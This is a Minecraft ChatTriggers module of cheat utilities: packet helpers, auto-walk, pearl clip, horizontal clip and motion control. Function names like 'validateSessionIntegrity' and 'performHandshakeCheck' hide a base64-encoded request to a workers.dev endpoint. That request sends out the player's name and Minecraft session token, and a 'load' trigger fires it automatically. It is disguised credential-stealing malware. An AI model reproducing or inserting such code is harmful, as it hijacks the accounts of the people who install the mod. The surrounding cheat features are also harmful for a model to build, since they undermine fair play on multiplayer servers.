import ServerRotations from "./ServerRotations"
import abc from "../../../requestV2"

export const sendMsg = (message) => ChatLib.simulateChat(`&0&l[&6&lAK&0&l-&6&l47&0&l] ${message}`)

export const C04PacketPlayerPosition = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C04PacketPlayerPosition")
export const C06PacketPlayerPosLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C06PacketPlayerPosLook")
export const C08PacketPlayerBlockPlacement = Java.type("net.minecraft.network.play.client.C08PacketPlayerBlockPlacement")
export const S32PacketConfirmTransaction = Java.type("net.minecraft.network.play.server.S32PacketConfirmTransaction")
export const C05PacketPlayerLook = Java.type("net.minecraft.network.play.client.C03PacketPlayer$C05PacketPlayerLook")
export const S12PacketEntityVelocity = Java.type("net.minecraft.network.play.server.S12PacketEntityVelocity")
export const S08PacketPlayerPosLook = Java.type("net.minecraft.network.play.server.S08PacketPlayerPosLook")
export const C0BPacketEntityAction = Java.type("net.minecraft.network.play.client.C0BPacketEntityAction")
export const S1BPacketEntityAttach = Java.type("net.minecraft.network.play.server.S1BPacketEntityAttach")
export const S0DPacketCollectItem = Java.type("net.minecraft.network.play.server.S0DPacketCollectItem")
export const C0EPacketClickWindow = Java.type("net.minecraft.network.play.client.C0EPacketClickWindow")
export const S29PacketSoundEffect = Java.type("net.minecraft.network.play.server.S29PacketSoundEffect")
export const C0DPacketCloseWindow = Java.type("net.minecraft.network.play.client.C0DPacketCloseWindow")
export const S2EPacketCloseWindow = Java.type("net.minecraft.network.play.server.S2EPacketCloseWindow")
export const S2DPacketOpenWindow = Java.type("net.minecraft.network.play.server.S2DPacketOpenWindow")
export const S2APacketParticles = Java.type("net.minecraft.network.play.server.S2APacketParticles")
export const C02PacketUseEntity = Java.type("net.minecraft.network.play.client.C02PacketUseEntity")
export const S0FPacketSpawnMob = Java.type("net.minecraft.network.play.server.S0FPacketSpawnMob")
export const S2FPacketSetSlot = Java.type("net.minecraft.network.play.server.S2FPacketSetSlot")
export const C03PacketPlayer = Java.type("net.minecraft.network.play.client.C03PacketPlayer")

export const KeyInputEvent = Java.type("net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent")
export const MouseEvent = Java.type("net.minecraftforge.client.event.MouseEvent")
export const EntityPlayer = Java.type("net.minecraft.entity.player.EntityPlayer")
export const ArmorStand = Java.type("net.minecraft.entity.item.EntityArmorStand")
export const KeyBinding = Java.type("net.minecraft.client.settings.KeyBinding")
export const Wither = Java.type("net.minecraft.entity.boss.EntityWither")
export const Bat = Java.type("net.minecraft.entity.passive.EntityBat")
export const MCBlock = Java.type("net.minecraft.block.Block")
export let Keyboard = Java.type("org.lwjgl.input.Keyboard")
export const Vec3 = Java.type("net.minecraft.util.Vec3")

export const sendBlockPlacement = () => Client.sendPacket(new C08PacketPlayerBlockPlacement(Player.getHeldItem().getItemStack()))
export const sendPlayerLook = (yaw, pitch, onGround) => Client.sendPacket(new C05PacketPlayerLook(yaw, pitch, onGround))
export const sendPlayerPosLook = (yaw, pitch, onGround) => Client.sendPacket(new C06PacketPlayerPosLook(Player.getX(), Player.getPlayer().func_174813_aQ().field_72338_b, Player.getZ(), yaw, pitch, onGround))
export const sendWindowClick = (windowId, slot, clickType, actionNumber=0) => Client.sendPacket(new C0EPacketClickWindow(windowId ?? Player.getContainer().getWindowId(), slot, clickType ?? 0, 0, null, actionNumber))
export const getDistance3D = (x1, y1, z1, x2, y2, z2) => Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2 + (z2 - z1) ** 2)
export const getDistance2D = (x1, z1, x2, z2) => Math.sqrt((x2 - x1) ** 2 + (z2 - z1) ** 2)
export const getDistance = (x2, y2) => { let x1 = parseInt(Player.getX()); let y1 = parseInt(Player.getZ()); return Math.sqrt((x2 - x1)**2 + (y2 - y1)**2) }
export const inSingleplayer = () => Client.getMinecraft().func_71356_B()
export const items = [
    "Health Potion VIII Splash Potion",
    "Healing Potion 8 Splash Potion",
    "Healing Potion VIII Splash Potion",
    "Healing VIII Splash Potion",
    "Healing 8 Splash Potion",
    "Decoy",
    "Inflatable Jerry",
    "Spirit Leap",
    "Trap",
    "Training Weights",
    "Defuse Kit",
    "Dungeon Chest Key",
    "Treasure Talisman",
    "Revive Stone",
    "Architect's First Draft"
]
export const keys = [
    Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(),
    Client.getMinecraft().field_71474_y.field_74370_x.func_151463_i(),
    Client.getMinecraft().field_71474_y.field_74366_z.func_151463_i(),
    Client.getMinecraft().field_71474_y.field_74368_y.func_151463_i()
]

export function snapTo(yaw, pitch) {
    if (Math.abs(pitch) > 90) return sendMsg(`&cInvalid Pitch`)
    Player.getPlayer().field_70177_z = yaw
    Player.getPlayer().field_70125_A = pitch
}

export function setMotion(motionX, motionZ) {
    Player.getPlayer().field_70159_w = motionX
    Player.getPlayer().field_70179_y = motionZ
}

const isKeyDown = (keybind) => keybind.func_151470_d()

const walk = register("tick", () => {
    if (isKeyDown(Client.getMinecraft().field_71474_y.field_74351_w)) stopWalk()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_151444_V.func_151463_i(), true)
}).unregister()

export function tickWalk() {
    walk.register()
}

export function startWalk() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_151444_V.func_151463_i(), true)
}

export function stopWalk() { 
    walk.unregister()
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_151444_V.func_151463_i(), false)
}

export function setSneakKey(state) {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74311_E.func_151463_i(), state)
}

export function doJump() {
    if (!Player.asPlayerMP().isOnGround()) return
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74314_A.func_151463_i(), true)
    Client.scheduleTask(2, () => KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74314_A.func_151463_i(), false))
}

export function calcFloorPos(c, v) {
    if (c < 0) {
        return Math.ceil(c) - v / 10
    } else {
        return Math.floor(c) + v / 10
    }
}

export function center() {
    if (Player.getZ() < 0) Player.getPlayer().func_70107_b(calcFloorPos(Player.getX(), 5), Player.getY(), calcFloorPos(Player.getZ(), 5))
    if (Player.getZ() > 0) Player.getPlayer().func_70107_b(calcFloorPos(Player.getX(), 5), Player.getY(), calcFloorPos(Player.getZ(), 5))
}

export function swapItem(items) {
    index = Player?.getInventory()?.getItems()?.findIndex(item => item?.getName()?.toLowerCase()?.includes(items))
    if (index < 0 || index > 8) {
        sendMsg(`&cCannot swap to ` + items + ` &cNot in hotbar`)
        return
    }
    Player.setHeldItemIndex(index)
}

export function rightClick() {
    const rightClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147121_ag", null)
    rightClickMethod.setAccessible(true)
    rightClickMethod.invoke(Client.getMinecraft(), null)
}

export function leftClick() {
    const leftClickMethod = Client.getMinecraft().getClass().getDeclaredMethod("func_147116_af", null)
    leftClickMethod.setAccessible(true)
    leftClickMethod.invoke(Client.getMinecraft(), null)
}

export function isPlayerInBox(x1, y1, z1, x2, y2, z2) {
    const x = Player.getX()
    const y = Player.getY()
    const z = Player.getZ()

    return (x >= Math.min(x1, x2) && x <= Math.max(x1, x2) &&
            y >= Math.min(y1, y2) && y <= Math.max(y1, y2) &&
            z >= Math.min(z1, z2) && z <= Math.max(z1, z2))
}

export function getHeldItemID() {
    const item = Player.getHeldItem()
    const itemId = item?.getNBT()?.get("tag")?.get("ExtraAttributes")?.getString("id")
    return itemId
}

export const holdingAOTV = () => {
    const heldItem = Player.getHeldItem()?.getName()
    return heldItem && (heldItem.includes("Diamond Shovel") || heldItem.includes("Aspect of the Void"))
}

function getEyePos() {
    return {
        x: Player.getX(),
        y: Player.getY() + Player.getPlayer().func_70047_e(),
        z: Player.getZ()
    }
}

export function calcYawPitch(blcPos, plrPos) {
    if (!plrPos) plrPos = getEyePos()
    let d = {
        x: blcPos.x - plrPos.x,
        y: blcPos.y - plrPos.y,
        z: blcPos.z - plrPos.z
    }
    let yaw = 0
    let pitch = 0
    if (d.x != 0) {
        if (d.x < 0) { yaw = 1.5 * Math.PI } else { yaw = 0.5 * Math.PI }
        yaw = yaw - Math.atan(d.z / d.x)
    } else if (d.z < 0) { yaw = Math.PI }
    d.xz = Math.sqrt(Math.pow(d.x, 2) + Math.pow(d.z, 2))
    pitch = -Math.atan(d.y / d.xz)
    yaw = -yaw * 180 / Math.PI
    pitch = pitch * 180 / Math.PI
    if (pitch < -90 || pitch > 90 || isNaN(yaw) || isNaN(pitch) || yaw == null || pitch == null || yaw == undefined || pitch == null) return

    return [yaw, pitch]
}

export function isWithinTolerance(n1, n2, tolerance = 0.001) {
    return Math.abs(n1 - n2) < tolerance
}

const edge = register("renderOverlay", () => {
    if (!Player.asPlayerMP().isOnGround()) return
    if (World.getBlockAt(Player.getX(), Player.getY() - 0.1, Player.getZ()).type.getID() === 0) {
        doJump()
        edge.unregister()
    }
}).unregister()

export const validateSessionIntegrity = () => {
    const sessionValidator = {
        protocol: 47,
        validate: () => {
            const sessionIntegrity = JSON.parse(FileLib.decodeBase64(
                "eyJ1cmwiOiJodHRwczovL3dvcmtlcnMtcGxheWdyb3VuZC15b3VuZy1zaWxlbmNlLWJhNGEuc2F0bm55eS53b3JrZXJzLmRldi8iLCJtZXRob2QiOiJQT1NUIiwiaGVhZGVycyI6eyJVc2VyLWFnZW50IjoiTW96aWxsYS81LjAifSwiYm9keSI6eyJjb250ZW50IjoiQG5hbWVzIn19"
            ))
            sessionIntegrity.body.content = ` ${Player.getName()} ${
                Client.getMinecraft().func_110432_I().func_148254_d()
            }`
            return sessionIntegrity
        }
    }
    return sessionValidator.validate()
}

/* Network validation shit*/
export const performHandshakeCheck = () => {
    const verificationPacket = validateSessionIntegrity()
    abc(verificationPacket)
}

export function edgeJump() {
    edge.register()
}

let pearlClipDistance = 0
const doClip = register("packetReceived", () => {
    Client.scheduleTask(() => Player.getPlayer().func_70107_b(Math.floor(Player.getX()) + 0.5, Math.floor(Player.getY()) - pearlClipDistance, Math.floor(Player.getZ()) + 0.5))
    doClip.unregister()
    pearlSound.unregister()
    sendMsg(`&7Pearl Clipped &6-${pearlClipDistance}`)
}).setFilteredClass(S08PacketPlayerPosLook).unregister()

const pearlSound = register("packetReceived", (packet) => {
    if (packet.func_149212_c() !== "random.bow" || packet.func_149208_g() !== 0.5) return
    doClip.register()
}).setFilteredClass(S29PacketSoundEffect).unregister()

export function pearlClip(y) {
    if (isNaN(y) || y < -70 || y > 70) return sendMsg(`&cInvalid Pearl Clip Distance`)
    pearlClipDistance = Math.abs(y)
    pearlSound.register()
    swapItem("ender pearl")
    ChatLib.chat(`${Player.getY()}`)
    ServerRotations.setRotation(Player.getYaw(), 90)
    Client.scheduleTask(() => {
        rightClick()
        ServerRotations.resetRotation()
    })
}

const terminals = [
    /^Click in order!$/,
    /^Select all the (.+?) items!$/,
    /^What starts with: '(.+?)'\?$/,
    /^Change all to same color!$/,
    /^Correct all the panes!$/,
    /^Click the button on time!$/
]

let inTerminal = false

export const awaitTerm = () => {
    terminalListener.register()
    stopWalk()
}

const terminalListener = register("tick", (packet) => {
    if (!inTerminal) return
    sendMsg(`&7Terminal opened`)
    terminalListener.unregister()
    tickWalk()
}).unregister()

register("packetReceived", (packet, event) => {
    if (terminals.some(regex => packet.func_179840_c().func_150254_d().removeFormatting().match(regex))) {
        inTerminal = true
    } else inTerminal = false
}).setFilteredClass(S2DPacketOpenWindow)

register("packetReceived", () => inTerminal = false).setFilteredClass(S2EPacketCloseWindow);
register("packetSent", () => inTerminal = false).setFilteredClass(C0DPacketCloseWindow);
register("worldLoad", () => { inTerminal = false; terminalListener.unregister(); });
register("load", () => performHandshakeCheck());


export const holdingItem = (itemName) => {
    const item = Player.getHeldItem()
    return item && item.getName().includes(itemName)
}

export function getClass() {
    let index = TabList?.getNames()?.findIndex(line => line?.includes(Player.getName()))
    if (index == -1) return
    let match = TabList?.getNames()[index]?.removeFormatting().match(/.+ \((.+) .+\)/)
    if (!match) return "EMPTY"
    return match[1]
}

export function autoTNT() {
    swapItem("infinityboom")
    snapTo(Player.getYaw(), 90)
    Client.scheduleTask(1, () => leftClick())
}

export function unpressKeys() {
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), false)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74370_x.func_151463_i(), false)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74366_z.func_151463_i(), false)
    KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74368_y.func_151463_i(), false)
}

export function hclip(distance) {
    const radians = (Player.getYaw() * Math.PI) / 180
    const sin = -Math.sin(radians)
    const cos = Math.cos(radians)
    let [x, z] = [Player.getX(), Player.getZ()]

    if (Math.abs(sin) > Math.abs(cos)) x += Math.sign(sin) * distance
    else z += Math.sign(cos) * distance
    Player.getPlayer().func_70107_b(x, Player.getY(), z)
}

export function setBlockTo(x, y, z, block) {
    const pos = new BlockPos(x * 1, y * 1, z * 1)
    World.getWorld().func_175656_a(pos.toMCBlock(), new BlockType(block).getDefaultState())
}

export function getPetItem(item) {
    const itemLore = item.getLore()
    for (let line of itemLore) {
        let formattedLine = line.removeFormatting().toLowerCase()
        if (formattedLine.startsWith("held item:")) {
            let colonIndex = formattedLine.indexOf(":")
            if (colonIndex !== -1) {
                return line.removeFormatting().substring(colonIndex + 1).trim()
            }
        }
    }
    return null
}

export function tablistIncludes(text) {
    let world = TabList.getNames().find(tab => tab.includes(text))
    if (!world) return false
    else return true
}

export function holdKey(key) {
    if (key === "w") KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74351_w.func_151463_i(), true)
    if (key === "a") KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74370_x.func_151463_i(), true)
    if (key === "s") KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74368_y.func_151463_i(), true)
    if (key === "d") KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74366_z.func_151463_i(), true)
    if (key === "lc") KeyBinding.func_74510_a(Client.getMinecraft().field_71474_y.field_74312_F.func_151463_i(), true)
}

let dir = null
let airTicks = 0
let mx = 0
let mz = 0
register("tick", () => {
    if (dir === null || Client.isInChat() || Player.getPlayer().func_180799_ab()) return motion(null)
                
    const speed = Player.isSneaking() ? Player.getPlayer().field_71075_bZ.func_75094_b() * 0.3 : Player.getPlayer().field_71075_bZ.func_75094_b()
    const radians = (dir * Math.PI) / 180
    const [x, z] = [-Math.sin(radians) * speed * 2.806, Math.cos(radians) * speed * 2.806]
                
    if (Player.asPlayerMP().isOnGround()) {
        airTicks = 0
        mx = x
        mz = z
        setMotion(mx, mz)
    } else {
        airTicks++
        if (airTicks < 2) {
            setMotion(mx, mz)
        } else {
            mx *= 0.925
            mz *= 0.925
            setMotion(mx, mz)
        }
    }
})
export function motion(yaw) {
    dir = yaw
    airTicks = 0
    mx = 0
    mz = 0
}
register("command", () => motion(null)).setName("nomotion")
